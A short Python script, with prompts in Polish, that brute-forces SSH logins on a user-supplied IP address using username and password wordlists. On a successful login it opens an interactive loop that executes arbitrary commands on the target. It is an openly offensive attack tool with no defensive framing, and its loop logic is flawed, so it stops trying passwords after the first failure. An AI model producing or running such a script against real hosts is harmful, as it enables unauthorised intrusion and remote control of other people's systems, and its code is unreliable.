import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
target_host = input("IP celu: ")
target_port = 22

users = open(r"C:\Users\wnerw\Desktop\user_list.txt")
passwords = open(r"C:\Users\wnerw\Desktop\password_list.txt")

authenticated = False
cmd = ""

for user in users:
    user = user.replace("\n", "")
    try:
        for password in passwords:
            password = password.replace("\n", "")
            ssh.connect(hostname=target_host, username=user, password=password, timeout=2, port=target_port)
            print("[+] Login udany przy userze: {} i haśle {} ".format(user, password))
            while True:
                cmd = input("Wpisz polecenie do wykonania w systemie: ")
                if cmd == "exit":
                    exit(0)
                else:
                    std_in, std_out, std_err = ssh.exec_command(cmd)
                    authenticated = True
                    print(
                        "Wykonanie polecenia:\n{} \nBłędy:\n{} \n".format(std_out.read().decode(),
                                                                          std_err.read().decode()))
    except paramiko.ssh_exception.AuthenticationException as error:
        print("Próba zalogowania...")
